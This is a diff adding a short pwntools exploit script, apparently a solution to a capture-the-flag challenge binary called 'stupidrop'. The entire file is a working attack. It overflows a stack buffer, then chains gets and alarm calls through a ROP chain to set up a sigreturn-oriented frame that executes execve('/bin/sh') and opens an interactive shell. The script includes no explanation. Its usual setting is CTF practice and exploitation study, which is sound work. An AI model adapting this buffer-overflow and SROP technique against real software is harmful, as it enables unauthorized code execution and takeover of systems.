@@ -1,0 +1,40 @@
+from pwn import *
+
+# write ROP call alarm(0) can bypass current alarm setting
+
+p = process("./stupidrop")
+'''
+p = gdb.debug("./stupidrop", gdbscript = 
+
+)
+'''
+e = ELF("./stupidrop")
+
+pop_rdi = 0x00000000004006a3
+syscall = 0x000000000040063e
+rw_section = 0x6010a0
+alarm_plt = e.plt['alarm']
+gets_plt = e.plt['gets']
+
+context.arch = "amd64"
+frame = SigreturnFrame()
+frame.rip = syscall
+frame.rax = 59
+frame.rdi = rw_section
+frame.rsi = 0
+frame.rdx = 0
+
+payload = b"A" * 0x30 + b"B" * 8
+payload += p64(pop_rdi) + p64(rw_section)
+payload += p64(gets_plt)
+payload += p64(pop_rdi) + p64(0xf)
+payload += p64(alarm_plt)
+payload += p64(pop_rdi) + p64(0)
+payload += p64(alarm_plt)
+payload += p64(syscall)
+payload += bytes(frame)
+p.sendline(payload)
+
+p.sendline(b"/bin/sh\x00")
+
+p.interactive()
